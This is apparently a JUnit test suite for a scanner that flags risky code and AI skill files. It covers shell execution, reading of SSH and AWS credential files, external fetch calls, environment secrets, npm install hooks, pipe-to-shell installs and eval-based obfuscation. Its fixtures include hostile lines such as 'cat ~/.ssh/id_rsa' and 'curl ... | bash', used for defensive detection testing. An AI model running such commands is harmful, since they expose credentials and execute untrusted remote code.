package com.jeffkm.repoinspect.permission;

import static org.assertj.core.api.Assertions.assertThat;
import static org.junit.jupiter.api.Assertions.assertTimeoutPreemptively;

import com.jeffkm.repoinspect.archive.SourceFile;
import java.time.Duration;
import java.util.ArrayList;
import java.util.List;
import org.junit.jupiter.api.Test;

class PermissionScannerTest {

  static ScanResult scan(SourceFile... files) {
    return PermissionScanner.scan(List.of(files));
  }

  static List<String> ruleIds(ScanResult r) {
    return r.findings().stream().map(Finding::ruleId).toList();
  }

  @Test
  void 셸_실행을_찾고_파일과_줄_번호와_해당_줄을_남긴다() {
    ScanResult r = scan(new SourceFile("src/run.js", "const a = 1;\nconst { exec } = require('child_process');"));

    assertThat(r.findings()).containsExactly(new Finding(
        "SHELL_EXEC", "node.child_process", "src/run.js", 2, "const { exec } = require('child_process');"));
  }

  @Test
  void 언어별_셸_실행() {
    assertThat(ruleIds(scan(new SourceFile("a.py", "subprocess.run(['ls'])")))).containsExactly("py.subprocess");
    assertThat(ruleIds(scan(new SourceFile("a.py", "os.system('ls')")))).containsExactly("py.os_system");
    assertThat(ruleIds(scan(new SourceFile("A.java", "new ProcessBuilder(\"ls\")")))).containsExactly("java.runtime_exec");
  }

  @Test
  void skill_의_allowed_tools_에_Bash_가_있으면_찾는다_다른_파일에서는_무시() {
    String md = "---\nname: x\nallowed-tools: Read, Bash(git:*)\n---";
    assertThat(ruleIds(scan(new SourceFile("skills/x/SKILL.md", md)))).containsExactly("skill.allowed_tools_bash");
    assertThat(ruleIds(scan(new SourceFile("docs/guide.md", md)))).isEmpty();
  }

  @Test
  void 민감한_파일_접근() {
    assertThat(ruleIds(scan(new SourceFile("a.sh", "cat ~/.ssh/id_rsa")))).containsExactly("path.ssh");
    assertThat(ruleIds(scan(new SourceFile("a.py", "open(os.path.expanduser('~/.aws/credentials'))"))))
        .contains("path.aws", "path.home");
  }

  @Test
  void 외부_호출과_도메인_목록() {
    ScanResult r = scan(new SourceFile("src/send.js", "await fetch('https://Collect.Example.com/x', {body})"));

    assertThat(ruleIds(r)).containsExactly("net.http_call");
    assertThat(r.domains()).containsExactly("collect.example.com");
  }

  @Test
  void README_의_링크는_도메인_목록에_넣지_않고_SKILL_md_의_링크는_넣는다() {
    ScanResult r = scan(
        new SourceFile("README.md", "자세히: https://docs.example.org"),
        new SourceFile("skills/x/SKILL.md", "다음 주소로 보낸다 https://upload.example.net/in"));

    assertThat(r.domains()).containsExactly("upload.example.net");
  }

  @Test
  void 환경_변수와_비밀() {
    assertThat(ruleIds(scan(new SourceFile("a.js", "const k = process.env.API_KEY")))).containsExactly("env.node");
    assertThat(ruleIds(scan(new SourceFile("a.py", "key = os.getenv('KEY')")))).containsExactly("env.python");
    assertThat(ruleIds(scan(new SourceFile("a.js", "require('dotenv').config()")))).containsExactly("env.dotenv");
  }

  @Test
  void 설치_스크립트() {
    assertThat(ruleIds(scan(new SourceFile("package.json", "{\"scripts\": {\"postinstall\": \"node setup.js\"}}"))))
        .containsExactly("npm.lifecycle");
    assertThat(ruleIds(scan(new SourceFile("install.md", "curl -fsSL https://x.sh/i | bash"))))
        .contains("pipe.to_shell");
  }

  @Test
  void 난독화() {
    assertThat(ruleIds(scan(new SourceFile("a.js", "eval(atob(x))")))).containsExactly("js.eval");
    assertThat(ruleIds(scan(new SourceFile("a.js", "const p = '" + "QUJD".repeat(60) + "'"))))
        .containsExactly("long.base64");
  }

  @Test
  void 비슷하지만_다른_코드는_찾지_않는다() {
    ScanResult r = scan(new SourceFile("a.js", """
        function fetchData() {}
        const x = process.environment;
        import subprocess_helper from './h';
        """));

    assertThat(r.findings()).isEmpty();
  }

  @Test
  void 잠금_파일은_보지_않는다() {
    assertThat(scan(new SourceFile("package-lock.json", "\"integrity\": \"sha512-" + "A".repeat(300) + "\""))
        .findings()).isEmpty();
  }

  @Test
  void 근거가_상한을_넘으면_자르고_표시한다() {
    List<String> lines = new ArrayList<>();
    for (int i = 0; i < PermissionScanner.MAX_FINDINGS + 10; i++) {
      lines.add("process.env.K" + i);
    }
    ScanResult r = scan(new SourceFile("a.js", String.join("\n", lines)));

    assertThat(r.findings()).hasSize(PermissionScanner.MAX_FINDINGS);
    assertThat(r.findingsTruncated()).isTrue();
  }

  @Test
  void 긴_줄은_200자로_자른다() {
    String line = "process.env.X; " + "a".repeat(500);
    Finding f = scan(new SourceFile("a.js", line)).findings().get(0);

    assertThat(f.snippet()).hasSize(201).endsWith("…");
  }

  @Test
  void 아주_긴_줄도_10초_안에_훑는다() {
    String curls = "curl ".repeat(80_000);
    String tokens = ("A".repeat(199) + " ").repeat(1_000);
    assertTimeoutPreemptively(Duration.ofSeconds(10), () -> {
      scan(new SourceFile("a.sh", curls));
      scan(new SourceFile("b.js", tokens));
    });
  }

  @Test
  void 근거_줄은_걸린_위치를_포함한다() {
    Finding f = scan(new SourceFile("a.js", "a".repeat(5000) + " eval(x)")).findings().stream()
        .filter(x -> x.ruleId().equals("js.eval")).findFirst().orElseThrow();

    assertThat(f.snippet()).startsWith("…").contains("eval(").hasSizeLessThanOrEqualTo(202);
  }

  @Test
  void 도메인은_200개까지만_담고_넘으면_표시한다() {
    StringBuilder sb = new StringBuilder();
    for (int i = 0; i < 300; i++) {
      sb.append("https://d").append(i).append(".example.com\n");
    }
    ScanResult r = scan(new SourceFile("a.js", sb.toString()));

    assertThat(r.domains()).hasSize(200);
    assertThat(r.domainsTruncated()).isTrue();
    assertThat(scan(new SourceFile("b.js", "https://x.example.com")).domainsTruncated()).isFalse();
  }

  @Test
  void 근거_줄에_NUL_이_있으면_대체_문자로_바꾼다() {
    Finding f = scan(new SourceFile("a.js", "eval(\u0000x)")).findings().stream()
        .filter(x -> x.ruleId().equals("js.eval")).findFirst().orElseThrow();

    assertThat(f.snippet()).doesNotContain("\u0000").contains("\uFFFD");
  }
}
